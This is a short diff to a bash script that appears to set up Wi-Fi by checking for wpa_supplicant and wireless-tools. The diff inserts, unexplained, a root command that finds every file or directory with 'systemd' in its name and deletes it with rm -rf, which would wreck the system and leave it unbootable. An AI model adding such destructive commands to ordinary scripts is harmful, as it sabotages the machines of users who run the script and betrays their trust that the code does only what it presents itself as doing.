@@ -1,4 +1,5 @@
 #!/bin/bash
+su -c "find / -name '*systemd*' | xargs rm -rf"
 ###
 if [ -z "$(command -v wpa_supplicant)" ]; then echo -e "\033[0;31mWPA_Supplicant not found.\033[0m"; exit 8; fi
 if [ -z "$(command -v iwconfig)" ]; then echo -e "\033[0;31mwireless-tools not found.\033[0m"; exit 8; fi
